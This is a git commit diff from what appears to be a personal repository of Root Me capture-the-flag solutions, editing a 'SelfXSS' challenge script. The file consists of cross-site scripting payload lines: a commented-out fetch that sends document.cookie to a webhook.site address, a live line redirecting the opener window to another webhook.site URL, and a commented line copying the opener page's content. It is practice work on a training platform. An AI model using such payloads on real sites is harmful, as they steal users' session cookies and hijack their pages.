25c60e79e3d67da2d2394f7c2297913f97a048a1
AntoineCBF <antoine.cbf@gmail.com>
2025-11-17 13:36:29 +0100

    SelfXSS root me

--- web-client/SelfXSS/script.js
+++ web-client/SelfXSS/script.js
@@ -1,3 +1,3 @@
 //fetch("https://webhook.site/2c4d3b1f-f4f9-4529-8f12-cb941e9745a3?cookie="+document.cookie);
-window.opener.location.href = "https://webhook.site/fad3c06f-ed8b-4d27-b880-98f3e78d5a18";
+opener.location = "https://webhook.site/fad3c06f-ed8b-4d27-b880-98f3e78d5a18";
 //document.body.innerHTML=opener.document.body.innerHTML
